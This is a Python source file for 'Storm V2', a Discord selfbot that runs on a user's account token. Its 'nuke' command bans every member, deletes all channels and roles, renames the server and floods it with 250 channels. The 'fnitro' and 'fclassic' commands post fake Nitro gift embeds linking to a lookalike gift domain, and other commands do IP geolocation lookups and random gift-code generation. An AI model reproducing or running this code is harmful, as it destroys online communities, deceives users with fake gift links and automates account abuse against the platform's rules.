import discord
import sys
import requests
import string
import random
import colorama
import base64
import os
import collections
import datetime
from datetime import date, time
import math
import asyncio
from discord.ext import commands
from discord.ext import tasks
import random
from json import load
from colorama import init, Fore
init()

with open("config.json") as f:
    config = load(f)
    prefix = config["prefix"]
    token = config["token"]
    ChannelName = config["channel-name"]

intents = discord.Intents.default()
intents.members = True
client = commands.Bot(command_prefix=prefix, intents=intents, self_bot=True, fetch_offline_members=False)
storm_version = "2.0"
client.remove_command("help")

@client.event
async def on_ready():
    os.system(f"clear")
    print(f"""
{Fore.LIGHTCYAN_EX}                     ███████╗████████╗ ██████╗ ██████╗ ███╗   ███╗    {Fore.LIGHTGREEN_EX}██╗   ██╗██████╗ 
{Fore.LIGHTCYAN_EX}                     ██╔════╝╚══██╔══╝██╔═══██╗██╔══██╗████╗ ████║    {Fore.LIGHTGREEN_EX}██║   ██║╚════██╗
{Fore.LIGHTCYAN_EX}     ╔════════╗      ███████╗   ██║   ██║   ██║██████╔╝██╔████╔██║    {Fore.LIGHTGREEN_EX}██║   ██║ █████╔╝
{Fore.LIGHTCYAN_EX}     ║{Fore.BLUE}By {Fore.GREEN}Shady{Fore.LIGHTCYAN_EX}║{Fore.LIGHTCYAN_EX}      ╚════██║   ██║   ██║   ██║██╔══██╗██║╚██╔╝██║    {Fore.LIGHTGREEN_EX}╚██╗ ██╔╝██╔═══╝ 
{Fore.LIGHTCYAN_EX}     ╚════════╝      ███████║   ██║   ╚██████╔╝██║  ██║██║ ╚═╝ ██║     {Fore.LIGHTGREEN_EX}╚████╔╝ ███████╗
{Fore.LIGHTCYAN_EX}                     ╚══════╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝      {Fore.LIGHTGREEN_EX}╚═══╝  ╚══════╝
{Fore.CYAN}════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════
    """)
    print(f"""
    {Fore.LIGHTBLUE_EX}╔════════════════════════════════════╗
    {Fore.CYAN}║ Name: {Fore.LIGHTMAGENTA_EX}{client.user.name}{Fore.CYAN}
    {Fore.CYAN}║ Prefix: {Fore.LIGHTMAGENTA_EX}{prefix}{Fore.CYAN}
    {Fore.CYAN}║ User ID: {Fore.LIGHTMAGENTA_EX}{client.user.id}{Fore.CYAN}
    {Fore.CYAN}║ Nitro: {Fore.LIGHTMAGENTA_EX}{client.user.premium}{Fore.CYAN}
    {Fore.CYAN}╚════════════════════════════════════╝
    {Fore.CYAN}╔════════════════════════════════════╗
    {Fore.CYAN}║ Discord Version: {Fore.LIGHTMAGENTA_EX}{discord.__version__}{Fore.CYAN}             ║
    {Fore.CYAN}║ Storm Version: {Fore.LIGHTMAGENTA_EX}2.0{Fore.CYAN}                 ║
    {Fore.CYAN}╚════════════════════════════════════╝
    """)

@client.command()
async def geo(ctx, ip: str=None):
    await ctx.message.delete()
    if ip is None: await ctx.send("Please include an IP address");return
    else:
        try:
            with requests.session() as ses:
                resp = ses.get(f'https://ipinfo.io/{ip}/json')
                if "Wrong ip" in resp.text:
                    await ctx.send("Invalid IP address")
                    return
                else:
                    try:
                        j = resp.json()
                        embed= discord.Embed(title="IP Info")
                        embed.add_field(name=f'IP', value=f'{ip}', inline=True)
                        embed.add_field(name=f'City', value=f'{j["city"]}', inline=True)
                        embed.add_field(name=f'Region', value=f'{j["region"]}', inline=True)
                        embed.add_field(name=f'Country', value=f'{j["country"]}', inline=True)
                        embed.add_field(name=f'Coordinates', value=f'{j["loc"]}', inline=True)
                        embed.add_field(name=f'Postal', value=f'{j["postal"]}', inline=True)
                        embed.add_field(name=f'Timezone', value=f'{j["timezone"]}', inline=True)
                        embed.add_field(name=f'Organization', value=f'{j["org"]}', inline=True)
                        embed.set_footer(text=" made by Shady")
                        await ctx.send(embed=embed)
                    except discord.HTTPException:
                        await ctx.send(f'**{ip} Info**\n\nCity: {j["city"]}\nRegion: {j["region"]}\nCountry: {j["country"]}\nCoordinates: {j["loc"]}\nPostal: {j["postal"]}\nTimezone: {j["timezone"]}\nOrganization: {j["org"]}')
        except Exception as e:
            await ctx.send(f"Error: {e}")

@client.command()
async def help(ctx):
    await ctx.message.delete()
    embed= discord.Embed(title=f"Help Menu")
    embed.add_field(name=f"Fun Commands", value=f"slots, cat, dog, nitro", inline=False)
    embed.add_field(name=f'NSFW Commands', value='pussy, anal, boobs, hentai', inline=False)
    embed.add_field(name=f'Nuke Commands', value='nuke', inline=False)
    embed.add_field(name='Spam Commands', value='null', inline=False)
    embed.add_field(name='Tool Commands', value='geo, b64', inline=False)
    embed.add_field(name='Troll Commands', value='fnitro, fclassic', inline=False)
    embed.add_field(name='Utility Commands', value='watching, playing, streaming, listening, stopactivity, btc, xmr, dog, eth', inline=False)
    embed.add_field(name='Storm Commands', value='info', inline=False)
    embed.set_footer(text=f'Prefix: {prefix}')
    embed.set_thumbnail(url='https://discordapp.com/channels/912517923057336331/913629398559760405/914662171953233931')
    await ctx.send(embed=embed)

@client.command()
async def info(ctx):
    await ctx.message.delete()
    embed= discord.Embed(title=f'Storm V2', description=f'Welcome to Storm V2 {client.user.name}! This is Version 2.0 of Storm Selfbot, I decided to revamp the old version becuse I was not completely satysfied with V1. So enjoy!\n')
    embed.add_field(name='Info', value=f'Name: {client.user.name}#{client.user.discriminator}\nID:{client.user.id}\nPrefix: {prefix}\nNitro: {client.user.premium}\nDiscord Version: {discord.__version__}\nStorm Version: 2.0')
    embed.set_footer(text='Have a nice day')
    await ctx.send(embed=embed)
    
@client.command()
async def hentai(ctx):
    await ctx.message.delete()
    api = requests.get("https://nekos.life/api/v2/img/Random_hentai_gif")
    json = api.json()
    msg = discord.Embed(description="Here you go")
    msg.set_image(url=json['url'])
    await ctx.send(embed=msg)
    
@client.command()
async def boobs(ctx):
    await ctx.message.delete()
    api = requests.get("https://nekos.life/api/v2/img/boobs")
    json = api.json()
    msg = discord.Embed(description="Here you go")
    msg.set_image(url=json['url'])
    await ctx.send(embed=msg)
    
@client.command()
async def anal(ctx):
    await ctx.message.delete()
    api = requests.get("https://nekos.life/api/v2/img/anal")
    json = api.json()
    msg = discord.Embed(description="Here you go")
    msg.set_image(url=json['url'])
    await ctx.send(embed=msg)

@client.command()
async def pussy(ctx):
    await ctx.message.delete()
    api = requests.get("https://nekos.life/api/v2/img/pussy")
    json = api.json()
    msg = discord.Embed(description="Here you go")
    msg.set_image(url=json['url'])
    await ctx.send(embed=msg)
    
@client.command(aliases=['slots', 'bet', "slotmachine"])
async def slot(ctx):
    print(f"|  [COMMAND >>>> Slots]  [USER >>>> {client.user.name}]  |")
    await ctx.message.delete()
    emojis = "🍎🍊🍐🍋🍉🍇🍓🍒"
    a = random.choice(emojis)
    b = random.choice(emojis)
    c = random.choice(emojis)
    slotmachine = f"**[ {a} {b} {c} ]\n{ctx.author.name}**,"
    if a == b == c:
        await ctx.send(embed=discord.Embed.from_dict(
            {"title": "Slot machine", "description": f"{slotmachine} Jackpot!!!"}))
    elif (a == b) or (a == c) or (b == c):
        await ctx.send(embed=discord.Embed.from_dict(
            {"title": "Slot machine", "description": f"{slotmachine} 2 in a row, you won!"}))
    else:
        await ctx.send(embed=discord.Embed.from_dict(
            {"title": "Slot machine", "description": f"{slotmachine} No match, you lost"}))


@client.command()
async def fnitro(ctx, *, user: discord.Member = None):
    await ctx.message.delete()
    if user is None:
        user = ctx.author
    embed = discord.Embed(title=f"Nitro", url="https://discordgift.site/bnXnA5ZSAix7eRyZ",
                          description=f"Expires in 48 hours", color=0xcb82d0)
    embed.set_thumbnail(url='https://discordgift.site/nitro.png')
    embed.set_author(name=f"A WILD GIFT APPEARS!")
    await ctx.send(embed=embed)


@client.command()
async def fclassic(ctx, *, user: discord.Member = None):
    await ctx.message.delete()
    if user is None:
        user = ctx.author
    embed = discord.Embed(title=f"Nitro Classic", url="https://discordgift.site/bnXnA5ZSAix7eRyZ",
                          description=f"Expires in 48 hours", color=0x92a7e6)
    embed.set_thumbnail(url='https://discordgift.site/classic.png')
    embed.set_author(name=f"A WILD GIFT APPEARS!")
    await ctx.send(embed=embed)
    
@client.command(aliases=["rekt", "rape"])
async def nuke(ctx):
    await ctx.message.delete()
    for user in list(ctx.guild.members):
        try:
            await user.ban()
            print("[NUKE] Users Banned")
        except:
            pass
    for channel in list(ctx.guild.channels):
        try:
            await channel.delete()
            print("[NUKE] Channels Deleted")
        except:
            pass
    for role in list(ctx.guild.roles):
        try:
            await role.delete()
            print("[NUKE] Roles Deleted")
        except:
            pass
    try:
        await ctx.guild.edit(
            name=RandString(),
            description="STORM SELFBOT",
            reason="STORM SELFBOT",
            icon=None,
            banner=None
        )
    except:
        pass
    for _i in range(250):
        await ctx.guild.create_text_channel(name=f"NUKED BY {client.user.name}")
        print("[NUKE] Channels Created")
        
@client.command()
async def cat(ctx):
        await ctx.message.delete()
        r = requests.get("https://some-random-api.ml/img/cat").json()
        embed = discord.Embed(color=0x0000)
        embed.set_author(name="Random Cat.", icon_url="https://discordapp.com/channels/912517923057336331/913629398559760405/914662171953233931") 
        embed.set_image(url=str(r["link"]))
        await ctx.send(embed=embed)
        

@client.command()
async def dog(ctx):
        await ctx.message.delete()
        r = requests.get("https://some-random-api.ml/img/dog").json()
        embed = discord.Embed(color=0x0000)
        embed.set_author(name="Random Dog." , icon_url="https://discordapp.com/channels/912517923057336331/913629398559760405/914662171953233931") 
        embed.set_image(url=str(r["link"]))
        await ctx.send(embed=embed)
        
@client.command()
async def nitro(ctx):
            await ctx.message.delete()
            await ctx.send(Nitro()) 
            
def Nitro():
    code = "".join(random.choices(string.ascii_letters + string.digits, k=16))
    return f"https://discord.gift/{code}"

def RandString():
    return "".join(random.choice(string.ascii_letters + string.digits) for i in range(random.randint(4, 4)))

@client.command(aliases=["stopstreaming", "stopstatus", "stoplistening", "stopplaying", "stopwatching"])
async def stopactivity(ctx):
    await ctx.message.delete()
    await client.change_presence(activity=None, status=discord.Status.dnd)

@client.command(aliases=["watch"])
async def watching(ctx, *, message):
    await ctx.message.delete()
    await client.change_presence(
        activity=discord.Activity(
            type=discord.ActivityType.watching,
            name=message
        ))

@client.command(aliases=["listen"])
async def listening(ctx, *, message):
    await ctx.message.delete()
    await client.change_presence(
        activity=discord.Activity(
            type=discord.ActivityType.listening,
            name=message,
        ))

@client.command(alises=["game"])
async def playing(ctx, *, message):
    await ctx.message.delete()
    game = discord.Game(
        name=message
    )
    await client.change_presence(activity=game)

@client.command(aliases=["streaming"])
async def stream(ctx, *, message):
    await ctx.message.delete()
    stream = discord.Streaming(
        name=message,
        url="https://twitch.com/LulzStorm",
    )
    await client.change_presence(activity=stream)

@client.command()
async def btc(ctx):
        await ctx.message.delete()
        r = requests.get("https://min-api.cryptocompare.com/data/price?fsym=BTC&tsyms=USD,EUR")
        kekistan = r.json()
        eur = kekistan['EUR']
        usd = kekistan['USD']
        embedic = discord.Embed(description=f'EUR: `{str(eur)}€`\nUSD: `{str(usd)}$`')
        embedic.set_author(name='Bitcoin', icon_url='https://cdn.discordapp.com/attachments/809476865274282054/810558144127172669/bitcoin-225079_960_720.png')
        await ctx.send(embed=embedic)
        
@client.command()
async def xmr(ctx):
        await ctx.message.delete()
        r = requests.get("https://min-api.cryptocompare.com/data/price?fsym=XMR&tsyms=USD,EUR")
        kekistan = r.json()
        eur = kekistan['EUR']
        usd = kekistan['USD']
        embedic = discord.Embed(description=f'EUR: `{str(eur)}€`\nUSD: `{str(usd)}$`')
        embedic.set_author(name='Monero', icon_url='https://cdn.freebiesupply.com/logos/large/2x/monero-logo-png-transparent.png')
        await ctx.send(embed=embedic)
        
@client.command()
async def doge(ctx):
        await ctx.message.delete()
        r = requests.get("https://min-api.cryptocompare.com/data/price?fsym=DOGE&tsyms=USD,EUR")
        kekistan = r.json()
        eur = kekistan['EUR']
        usd = kekistan['USD']
        embedic = discord.Embed(description=f'EUR: `{str(eur)}€`\nUSD: `{str(usd)}$`')
        embedic.set_author(name='Dogecoin', icon_url='https://cdn.coindoo.com/2019/10/dogecoin-logo.png')
        await ctx.send(embed=embedic)
        
@client.command()
async def eth(ctx):
        await ctx.message.delete()
        r = requests.get("https://min-api.cryptocompare.com/data/price?fsym=ETH&tsyms=USD,EUR")
        kekistan = r.json()
        eur = kekistan['EUR']
        usd = kekistan['USD']
        embedic = discord.Embed(description=f'EUR: `{str(eur)}€`\nUSD: `{str(usd)}$`')
        embedic.set_author(name='Ethereum', icon_url='https://cdn.freebiesupply.com/logos/large/2x/ethereum-1-logo-png-transparent.png')
        await ctx.send(embed=embedic)


@client.command()
async def b64(ctx, *, args):
        await ctx.message.delete()
        msg = base64.b64encode('{}'.format(args).encode('ascii'))
        enc = str(msg)
        enc = enc[2:len(enc)-1]
        await ctx.send(enc)
 
client.run(token, bot=False)
